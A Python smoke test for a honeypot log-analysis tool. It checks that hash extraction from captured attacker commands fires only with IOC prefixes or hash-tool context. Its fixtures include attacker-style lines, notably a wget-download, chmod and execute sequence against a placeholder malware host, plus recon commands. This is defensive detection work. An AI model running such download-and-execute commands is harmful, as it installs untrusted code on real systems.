"""Smoke test for ROADMAP #9 — context-anchored hash extraction.

The old `_HASH_RE` accepted any 32/40/64-hex string in command text,
creating spurious cross-session edges in the infrastructure miner when
UUIDs / request IDs / fakefs paths happened to land in command_input
events.

The new design requires either:
  1. IOC-style prefix: `sha256:HEX`, `md5:HEX`, `sha1:HEX` (also `=` works).
  2. Tool context: a hash-producing tool name (`sha256sum`, `md5sum`,
     `openssl dgst`, `certutil`, `gpg --print-md`, `shasum`, etc.)
     appearing anywhere in the same command text.

This smoke confirms the positive set still fires AND the negative set
doesn't — so we don't swing too far the other way.

Standalone — no ES.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_hash_anchor.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.sources.cowrie.campaigns import _extract_artifacts

# Long-ish hex literals used as test fixtures.
H64 = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
H40 = "1234567890abcdef1234567890abcdef12345678"
H32 = "d877f783d5d3ef8c1234567890abcdef"

# Distinct fake hashes for collision-resistant assertions.
H64_A = "11" + H64[2:]
H64_B = "22" + H64[2:]


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


def hashes(text: str) -> list[str]:
    return [v for (k, v) in _extract_artifacts(text) if k == "hash"]


# -------------------------------------------------------------------------
# [1] Prefix-style — must always be captured
# -------------------------------------------------------------------------
print("\n[1] prefix-style hashes (sha256:, sha1:, md5:)")
check("sha256:HEX", hashes(f"sha256:{H64}") == [H64])
check("md5:HEX",    hashes(f"md5:{H32}") == [H32])
check("sha1:HEX",   hashes(f"sha1:{H40}") == [H40])
check("uppercase prefix",
      hashes(f"SHA256:{H64.upper()}") == [H64])
check("'=' separator too (some IOC dumps use this)",
      hashes(f"sha256={H64}") == [H64])


# -------------------------------------------------------------------------
# [2] Tool-context — must be captured when a hash tool appears anywhere
# -------------------------------------------------------------------------
print("\n[2] tool-context hashes")
check("sha256sum mention + bare hex anywhere",
      hashes(f"wget http://x/foo; sha256sum foo | grep {H64}") == [H64])
check("md5sum mention + bare hex",
      hashes(f"if [ \"$(md5sum f)\" = \"{H32}\" ]; then run; fi") == [H32])
check("openssl dgst (multi-word tool name)",
      hashes(f"openssl dgst -sha256 file && verify {H64}") == [H64])
check("certutil (Windows-style)",
      hashes(f"certutil -hashfile a.exe SHA256 ; check {H40}") == [H40])
check("shasum + multiple hex literals (each captured once)",
      sorted(hashes(f"shasum -a 256 file; {H64_A}; {H64_B}; {H64_A}"))
      == sorted([H64_A, H64_B]))


# -------------------------------------------------------------------------
# [3] Standalone hex (no prefix, no tool) — must NOT match
# These are the audit's false-positive cases.
# -------------------------------------------------------------------------
print("\n[3] standalone hex with NO context — must NOT match")
check("bare 64-hex token in random text", hashes(f"req_id={H64} status=ok") == [])
check("bare 32-hex (UUID-without-hyphens shape)",
      hashes(f"session_id {H32} closed") == [])
check("bare 40-hex (git-sha-like)",
      hashes(f"commit {H40}") == [])
check("hex in a URL (URL miner already handles URLs)",
      hashes(f"wget http://{H64}.example.com/file") == [])
check("hex in a path (fakefs / inode style)",
      hashes(f"cat /proc/abc/{H64}/maps") == [])


# -------------------------------------------------------------------------
# [4] Mixed: prefix + tool + bare. Each captured exactly once via dedup.
# -------------------------------------------------------------------------
print("\n[4] dedup + mixed sources")
# Prefix style + tool context both reference the same hex.
result = hashes(f"sha256:{H64} | sha256sum file && cat {H64}")
check("same hex via prefix and tool branches collapses to one match",
      result == [H64], f"got {result!r}")


# -------------------------------------------------------------------------
# [5] Real-world-ish attacker command lines
# -------------------------------------------------------------------------
print("\n[5] realistic command lines")
# A typical drop-and-verify pattern.
realistic_yes = (
    f"wget -q http://malware.example.org/payload.bin && "
    f"sha256sum payload.bin && "
    f"[ \"$(sha256sum payload.bin | cut -d' ' -f1)\" = \"{H64}\" ] && "
    f"chmod +x payload.bin && ./payload.bin"
)
check("malware verify pattern → hash captured",
      hashes(realistic_yes) == [H64])
# An equally-typical RECON pattern that contains a 64-hex token (Cowrie
# fakefs id) but no hash tool — must NOT yield a hash.
realistic_no = (
    f"ls -la; cat /proc/cpuinfo; "
    f"cat /sys/class/dmi/id/product_uuid; "
    f"echo session_{H32}_closed; "
    f"echo {H64}; uname -a"
)
check("recon pattern with stray hex literals → 0 hashes",
      hashes(realistic_no) == [],
      f"got {hashes(realistic_no)!r}")


# -------------------------------------------------------------------------
# [6] Empty / pathological inputs
# -------------------------------------------------------------------------
print("\n[6] empty/edge inputs")
check("empty string → []", hashes("") == [])
check("None handled as empty", _extract_artifacts(None) == [])    # type: ignore[arg-type]
check("hex tool name without any hex → []",
      hashes("sha256sum --help") == [])


# -------------------------------------------------------------------------
# Summary
# -------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
